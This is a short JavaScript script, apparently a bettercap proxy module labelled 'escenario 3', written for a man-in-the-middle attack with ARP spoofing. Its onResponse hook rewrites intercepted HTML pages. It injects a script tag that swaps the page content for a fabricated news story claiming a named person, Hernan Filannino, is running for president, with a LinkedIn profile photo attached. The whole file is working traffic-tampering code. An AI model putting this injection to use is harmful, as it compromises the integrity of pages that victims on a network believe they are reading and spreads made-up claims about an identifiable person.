// script escenario 3
function onLoad() {
  log( "Script loaded." );
  //log("targets: " + env('arp.spoof.targets'));
}

function onResponse(req, res) {
  if( res.ContentType.indexOf('text/html') == 0 ){
    var body = res.ReadBody();
    if( body.indexOf('</head>') != -1 ) {
      log( "Script executed." );
      res.Body = body.replace( 
        'id="content2">',
        'id="content2"><script type="text/javascript"> document.getElementById("content").innerHTML = \'<div role="main" class="site-content" id="content"><div class="block_home_slider" note="475348"><div class="post-image"><img src="https://media.licdn.com/dms/image/C5603AQHCp9VI8CKrGA/profile-displayphoto-shrink_100_100/0?e=1564012800&v=beta&t=HRAlHJGzcSGdiwO4zYhtnUpqzjHCYOS1JNDvUtqeGR8" width="620" height="310"></div><div class="post-content"><div class="title">Hernan Filannino, el nuevo candidato a presidente</div></div><div class="post-body">Hernan Filannino, más conocido como "Fila", lanzó su candidatura a presidente en el día de la fecha. El resto de los candidatos no contaban con semejante competencia.</div></div></div>\'; </script>'
      ); 
    }
  }
}

//á é í ó ú
